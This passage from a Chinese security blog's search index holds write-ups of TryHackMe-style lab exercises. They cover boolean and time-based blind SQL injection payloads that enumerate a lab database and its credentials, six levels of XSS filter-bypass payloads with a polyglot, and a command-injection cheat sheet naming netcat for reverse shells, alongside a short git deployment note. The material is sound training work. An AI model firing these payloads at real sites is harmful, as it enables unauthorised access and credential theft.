true。\n与前面的级别一样，我们的第一个任务是建立 users\u0026rsquo; 表中的列数，这可以通过使用 UNION 语句来实现。将 username 值更改为以下内容：\nadmin123' UNION SELECT 1;-- 由于 Web 应用程序已使用取为 false 的值 进行响应，因此我们可以确认这是不正确的列值。 继续添加更多列，直到我们得到 true 的 taken 值 。您可以通过将 username 设置为以下值来确认答案为三列：\nadmin123' UNION SELECT 1,2,3;-- 在我们已经确定了列数，我们可以进行数据库的枚举。我们的第一个任务是发现数据库名称。我们可以通过使用内置的 database（） 方法，然后使用 like 运算符来尝试查找将返回 true 状态的结果。\n尝试以下 username 值，看看会发生什么：\nadmin123' UNION SELECT 1,2,3 where database() like '%';--\n我们得到一个 true 响应，因为在 like 运算符中，我们只有 % 的值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%，**您将看到响应返回 false，这确认数据库名称不以字母 a 开头。我们可以循环遍历所有字母、数字和字符，例如 - 和 _，直到找到匹配项。如果您将以下内容作为 username 值发送，您将收到一个 true 响应，确认数据库名称以字母 s 开头\nadmin123' UNION SELECT 1,2,3 where database() like 's%';--\n现在，您继续 数据库名称的下一个字符，直到找到另一个真实的响应，例如，\u0026lsquo;sa%\u0026rsquo;、\u0026lsquo;sb%\u0026rsquo;、\u0026lsquo;sc%\u0026rsquo; 等。继续此过程，直到发现数据库名称的所有字符，即 sqli_three\n我们已经建立了数据库名称，现在我们可以通过使用 information_schema 数据库使用类似的方法使用它来枚举表名。尝试将 username 设置为以下值：\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--\n此查询在 tables 表中的 information_schema 数据库中 查找数据库名称与 sqli_three 匹配 且表名称以字母 a 开头的结果。 由于上述查询导致 false 响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。和以前一样，您需要在字母、数字和字符之间循环，直到找到正匹配项。\n您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下 username payload 来确认该表：\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--\n最后，我们现在需要枚举 users 表中的列名 ，以便我们可以正确地搜索登录凭据。 同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询它的列名。使用下面的有效负载，我们搜索 columns 表，其中 database 等于 sqli_three，表名称为 users，列名称以字母 a 开头。\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';\n同样， 您需要在字母、数字和字符之间循环，直到找到匹配项。由于您要查找多个结果，因此每次找到新的列名称时，都必须将其添加到有效负载中，以避免发现相同的结果。例如，找到名为 id 的列后，将其附加到原始有效负载中（如下所示）。\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';\n重复此过程 3 次，您将发现列的 ID、用户名和密码。现在，您可以使用它来查询 users 表以获取登录凭据。首先，您需要找到一个有效的用户名，您可以使用下面的有效负载：\nadmin123' UNION SELECT 1,2,3 from users where username like 'a%\nadmin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%\n基于时间的盲注 基于时间的盲目 SQL 注入与上述基于 布尔值的盲注非常相似，因为发送的请求相同，但这次没有明显的查询是错还是对的指示。相反，正确查询的指标基于查询完成所需的时间。此时间延迟是使用内置方法（如 SLEEP（x） 和 UNION 语句引入的。SLEEP（） 方法只会在成功的 UNION SELECT 语句后执行。\n实际： 因此，例如，在尝试建立表中的列数时，您将使用以下查询：\nadmin123' UNION SELECT SLEEP(5);--\n如果响应时间没有暂停，则我们知道查询不成功，因此与之前的任务一样，我们添加另一列：\nadmin123' UNION SELECT SLEEP(5),2;--\n有效负载应产生 5 秒的延迟，确认 UNION 语句成功执行，并且有两列。\n按照布尔盲注的步骤，只是更改一下前面的语句，要改成sleep()形式\n最后得到admin：4961\n","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/73aeab67fb4786d5331bab4f3b2452827dba9d186069cdc60db0ecfab89b34c5.png","permalink":"https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","title":"SQL注入基础"},{"content":"XSS THM 做题记录 Level One: 看到一个表单，要您输入的姓名，输入姓名后，该表单将在下面的一行中显示，例如：\n如果查看 Page Source，将看到姓名反映在代码中：\n我们将尝试输入以下 JavaScript Payload，而不是输入姓名： \u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n现在，当单击输入按钮时，将收到一个带有字符串 THM 的警报弹出窗口，页面源代码将如下所示：\nLevel Two： 与上一个级别一样，系统将再次要求您输入的姓名。这一次，当单击 enter 时，姓名将反映在 input 标签中：\n查看页面源，可以看到姓名反映在 input 标签的 value 属性中：\n如果要尝试前面的 JavaScript 有效负载，它将不起作用，因为无法从 input 标签内部运行它。相反，我们需要先转义 input 标签，以便 payload 可以正常运行。可以使用以下有效负载执行此作：\n\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n有效负载的重要部分是“\u0026gt;”，它关闭 value 参数，然后关闭 input 标记。\n现在，这会正确关闭 input 标记并允许 JavaScript 有效负载运行：\nLevel Three: 看到另一个表单，询问名字，与上一级一样，名字会反映在 HTML 标签中，这次是 textarea 标签。\n我们必须使用以下有效负载，以略微不同的方式转义 textarea 标签和输入 1（在 Level Two 中）：\n\u0026lt;/textarea\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt;\n上述有效负载的重要部分是 \u0026lt;/textarea\u0026gt;，它会导致 textarea 元素关闭，以便脚本运行。\nLevel Four: 在表单中输入姓名，会在页面上看到它。此级别看起来类似于 1 级，但在检查页面源代码时，会看到名字反映在一些 JavaScript 代码中。\n必须转义现有的 JavaScript 命令，以便能够运行代码;可以使用以下有效负载 ';alert（'THM'）;// 从下面的屏幕截图中可以看到，它将执行代码。' 关闭指定名称的字段，然后 ;表示当前命令的结束，末尾的 则``使它后面的任何内容成为注释，而不是可执行代码。\nLevel Five: 现在，此级别看起来与级别 1 相同，并且名字也会反映在同一个位置。但是，如果尝试有效负载 \u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt; ，它将不起作用。当查看页面源代码时，将了解原因。\nscript 会从有效负载中删除，这是因为有一个过滤器可以去除任何具有潜在危险的单词。\n当一个单词从字符串中删除时，你可以尝试一个有用的技巧。\n尝试输入有效负载 \u0026lt;sscriptcript\u0026gt;alert('THM');\u0026lt;/sscriptcript\u0026gt; 并单击输入按钮，将看到一个带有字符串 THM 的警报弹出窗口。\nLevel Six: 与第二级类似，我们必须从 input 标签的 value 属性中转义，我们可以尝试 \u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('THM');\u0026lt;/script\u0026gt; ，但这似乎不起作用。让我们检查一下页面源代码，看看为什么这不起作用。\n可以看到 \u0026lt; 和 \u0026gt; 字符从我们的 payload 中被过滤掉，从而阻止我们转义 IMG 标签。为了绕过过滤器，我们可以利用 IMG 标签的其他属性，比如 onload 事件。onload 事件将在 src 属性中指定的图像加载到网页后执行您选择的代码。\n让我们更改 payload 以反映这一点 /images/cat.jpg\u0026quot; onload=\u0026quot;alert('THM'); ，然后查看页面源，您将看到这将如何工作。\nPolyglots: XSS 多语言是一串文本，可以一站式转义属性、标签和绕过过滤器。可以在刚刚完成的所有 6 个级别上使用以下多语言，并且它会成功执行代码。\n1 jaVasCript:/*-/*`/*\\`/*\u0026#39;/*\u0026#34;/**/(/* */onerror=alert(\u0026#39;THM\u0026#39;) )//%0D%0A%0d%0a//\u0026lt;/stYle/\u0026lt;/titLe/\u0026lt;/teXtarEa/\u0026lt;/scRipt/--!\u0026gt;\\x3csVg/\u0026lt;sVg/oNloAd=alert(\u0026#39;THM\u0026#39;)//\u0026gt;\\x3e ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/b700481cd7430f01667bb498798f40d218f0b35bb085b3ffa989e042ad5542a1.png","permalink":"https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/","title":"关于XSS基础的利用"},{"content":"自动部署 参考 【Hugo】Hugo + Github 免费部署自己的博客\n首次部署 1 2 3 4 5 6 git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin {你的github仓库地址} git push -u origin main 更新 在dev目录下\n1 2 3 4 5 git init git add . git commit -m \u0026#34;update\u0026#34; git branch -M main git push ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/d67014b38a1cd68b40e838a207152f5a77ecfc8a2e40c3d56b538fa48de38080.png","permalink":"https://Yerucrem.github.io/p/%E5%88%A9%E7%94%A8github%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/","title":"利用github实现自动部署"},{"content":"命令注入 分类 命令注入主要可以通过以下两种方式之一进行检测：\n盲命令注入 详细命令注入 方法 描述 盲 这种类型的注入是在测试有效负载时应用程序没有直接输出的地方。您必须调查应用程序的行为，以确定您的有效负载是否成功。 详细 这种类型的注入是测试有效负载后从应用程序获得直接反馈的地方。例如，运行 whoami 命令以查看应用程序在哪个用户下运行。Web 应用程序将直接在页面上输出用户名。 有用的有效载荷 Linux 有效载荷 描述 whoami 查看应用程序在哪个用户下运行。 ls 列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。 ping 此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。 sleep 这是测试应用程序盲目命令注入时的另一个有用有效负载，其中计算机未安装 ping。 nc Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机上导航，以获取其他服务、文件或提升权限的潜在方法。 windows 有效载荷 描述 whoami 查看应用程序在哪个用户下运行。 dir 列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。 ping 此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。 timeout 此命令还将调用应用程序以挂起。如果未安装 ping 命令，则它还可用于测试应用程序是否进行盲命令注入。 ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f11677927824a3d078e08a2c300d8ccf225d496d442a2b7c8be0ca2d5adf6d9a.png","permalink":"https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","title":"命令注入基础"},{"content":"TEST ","date":"2024-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/01DFA140B78CF068F9CB2ACC01C76E40.jpg","permalink":"https://Yerucrem.github.io/p/%E6%B5%8B%E8%AF%95/","title":"测试"},{"content":"","date":"0001-01-01T00:00:00Z","permalink":"https://Yerucrem.github.io/p/","title":""}]